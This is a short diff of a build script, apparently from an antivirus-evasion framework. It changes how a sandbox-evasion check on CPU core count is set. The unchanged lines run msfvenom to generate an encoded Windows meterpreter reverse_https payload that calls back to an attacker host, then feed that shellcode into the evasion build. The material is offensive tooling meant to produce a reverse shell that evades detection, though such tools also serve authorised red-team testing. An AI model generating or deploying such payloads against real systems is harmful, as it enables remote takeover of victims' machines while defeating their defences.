@@ -22,10 +22,8 @@ LHOST=$GLOBAL_LHOST
 # generate payload and call avet
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
 
-# set define for number of cores, here runs if at least 2 cores are available
-printf "\n#define MIN_CPU_CORES 2\n" >> source/evasion/evasion.include
-# add evasion by maximum numbers of cpu cores
-add_evasion get_cpu_cores
+# exit if target has less than 2 cpu cores
+add_evasion get_cpu_cores 2
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
